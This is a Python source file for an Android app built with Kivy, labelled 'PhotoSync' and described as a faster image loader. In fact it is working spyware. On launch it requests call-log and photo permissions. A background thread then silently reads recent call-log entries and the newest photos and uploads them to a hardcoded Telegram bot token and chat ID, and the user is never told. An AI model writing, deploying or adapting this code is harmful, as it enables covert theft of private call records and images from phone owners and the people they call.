# language: Python, file: main.py, target: Android (Kivy + Buildozer / pyjnius, API 26+)
# *Faster MediaStore image loading via Java ByteArrayOutputStream + parallel Telegram upload pool*
from concurrent.futures import ThreadPoolExecutor, as_completed
import mimetypes
import threading
import time
import urllib.parse
import urllib.request

from jnius import autoclass, run_on_ui_thread
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label

BOT_TOKEN = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
CHAT_ID = "8859920681"

PythonActivity = autoclass("org.kivy.android.PythonActivity")
ManifestPermission = autoclass("android.Manifest$permission")
PackageManager = autoclass("android.content.pm.PackageManager")
BuildVersion = autoclass("android.os.Build$VERSION")
BuildVersionCodes = autoclass("android.os.Build$VERSION_CODES")
CallLogCalls = autoclass("android.provider.CallLog$Calls")
MediaStoreImagesMedia = autoclass("android.provider.MediaStore$Images$Media")
Uri = autoclass("android.net.Uri")
ByteArrayOutputStream = autoclass("java.io.ByteArrayOutputStream")
JavaByteArray = autoclass("[B")


def get_activity():
    return PythonActivity.mActivity


def has_permission(perm: str) -> bool:
    act = get_activity()
    if act is None:
        return False
    return act.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED


def required_permissions() -> list[str]:
    perms = [ManifestPermission.READ_CALL_LOG]
    if BuildVersion.SDK_INT >= BuildVersionCodes.TIRAMISU:
        perms.append(ManifestPermission.READ_MEDIA_IMAGES)
    else:
        perms.append(ManifestPermission.READ_EXTERNAL_STORAGE)
    return perms


@run_on_ui_thread
def request_missing_permissions(missing: list[str], req_code: int = 101) -> None:
    act = get_activity()
    if act is not None and missing:
        act.requestPermissions(missing, req_code)


def read_call_logs(limit: int = 30) -> list[str]:
    if not has_permission(ManifestPermission.READ_CALL_LOG):
        return []
    act = get_activity()
    if act is None:
        return []
    resolver = act.getContentResolver()
    projection = [
        CallLogCalls.NUMBER,
        CallLogCalls.CACHED_NAME,
        CallLogCalls.TYPE,
        CallLogCalls.DURATION,
        CallLogCalls.DATE,
    ]
    type_map = {
        CallLogCalls.INCOMING_TYPE: "IN",
        CallLogCalls.OUTGOING_TYPE: "OUT",
        CallLogCalls.MISSED_TYPE: "MISSED",
        CallLogCalls.REJECTED_TYPE: "REJECTED",
    }
    rows: list[str] = []
    cursor = resolver.query(CallLogCalls.CONTENT_URI, projection, None, None, f"{CallLogCalls.DATE} DESC")
    if cursor is None:
        return rows
    try:
        n_i = cursor.getColumnIndexOrThrow(CallLogCalls.NUMBER)
        c_i = cursor.getColumnIndexOrThrow(CallLogCalls.CACHED_NAME)
        t_i = cursor.getColumnIndexOrThrow(CallLogCalls.TYPE)
        d_i = cursor.getColumnIndexOrThrow(CallLogCalls.DURATION)
        ts_i = cursor.getColumnIndexOrThrow(CallLogCalls.DATE)
        while cursor.moveToNext() and len(rows) < limit:
            rows.append(
                f"[{type_map.get(cursor.getInt(t_i), 'OTHER')}] "
                f"{cursor.getString(n_i) or 'unknown'} ({cursor.getString(c_i) or ''}) "
                f"dur={cursor.getLong(d_i)}s ts={cursor.getLong(ts_i)}"
            )
    finally:
        cursor.close()
    return rows


def read_image_uris(limit: int = 10) -> list:
    perm = (
        ManifestPermission.READ_MEDIA_IMAGES
        if BuildVersion.SDK_INT >= BuildVersionCodes.TIRAMISU
        else ManifestPermission.READ_EXTERNAL_STORAGE
    )
    if not has_permission(perm):
        return []
    act = get_activity()
    if act is None:
        return []
    resolver = act.getContentResolver()
    base = MediaStoreImagesMedia.EXTERNAL_CONTENT_URI
    cursor = resolver.query(
        base, [MediaStoreImagesMedia._ID], None, None, f"{MediaStoreImagesMedia.DATE_ADDED} DESC"
    )
    if cursor is None:
        return []
    uris = []
    try:
        id_i = cursor.getColumnIndexOrThrow(MediaStoreImagesMedia._ID)
        while cursor.moveToNext() and len(uris) < limit:
            uris.append(Uri.withAppendedPath(base, str(cursor.getLong(id_i))))
    finally:
        cursor.close()
    return uris


def read_uri_bytes_fast(uri) -> bytes:
    act = get_activity()
    if act is None:
        return b""
    stream = act.getContentResolver().openInputStream(uri)
    if stream is None:
        return b""
    baos = ByteArrayOutputStream()
    buf = JavaByteArray(65536)
    try:
        while True:
            n = stream.read(buf)
            if n == -1:
                break
            baos.write(buf, 0, n)
        return bytes(baos.toByteArray())
    finally:
        stream.close()
        baos.close()


def send_text(text: str) -> None:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": CHAT_ID, "text": text[:3900]}).encode("utf-8")
    req = urllib.request.Request(
        url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        if not (200 <= resp.status < 300):
            raise RuntimeError(f"Telegram sendMessage HTTP {resp.status}")


def send_photo_with_retry(raw: bytes, name: str, retries: int = 3) -> None:
    if not raw:
        return
    boundary = f"----PyBoundary{int(time.time() * 1000)}_{name}"
    crlf = "\r\n"
    mime = mimetypes.guess_type(name)[0] or "image/jpeg"
    body = bytearray()
    body.extend(
        f"--{boundary}{crlf}Content-Disposition: form-data; name=\"chat_id\"{crlf}{crlf}{CHAT_ID}{crlf}".encode(
            "utf-8"
        )
    )
    body.extend(
        f"--{boundary}{crlf}Content-Disposition: form-data; name=\"photo\"; filename=\"{name}\"{crlf}"
        f"Content-Type: {mime}{crlf}{crlf}".encode("utf-8")
    )
    body.extend(raw)
    body.extend(f"{crlf}--{boundary}--{crlf}".encode("utf-8"))
    payload = bytes(body)

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    for attempt in range(1, retries + 1):
        try:
            req = urllib.request.Request(
                url,
                data=payload,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=60) as resp:
                if 200 <= resp.status < 300:
                    return
                raise RuntimeError(f"HTTP {resp.status}")
        except Exception:
            if attempt < retries:
                time.sleep(1.5 * attempt)
            else:
                raise


def _upload_single_uri(idx: int, uri) -> None:
    raw = read_uri_bytes_fast(uri)
    if raw:
        send_photo_with_retry(raw, f"photo_{idx}_{int(time.time() * 1000)}.jpg")


def run_sync(max_workers: int = 3) -> None:
    logs = read_call_logs(limit=30)
    if logs:
        try:
            send_text("CallLogs:\n" + "\n".join(logs))
        except Exception:
            pass

    uris = read_image_uris(limit=10)
    if not uris:
        return

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = [pool.submit(_upload_single_uri, idx, uri) for idx, uri in enumerate(uris)]
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception:
                pass


class PhotoSyncApp(App):
    def build(self):
        layout = BoxLayout()
        layout.add_widget(Label(text="PhotoSync"))
        Clock.schedule_once(self._boot_worker, 0.5)
        return layout

    def _boot_worker(self, _dt):
        missing = [p for p in required_permissions() if not has_permission(p)]
        if missing:
            request_missing_permissions(missing)
        threading.Thread(target=run_sync, daemon=True).start()


if __name__ == "__main__":
    PhotoSyncApp().run()
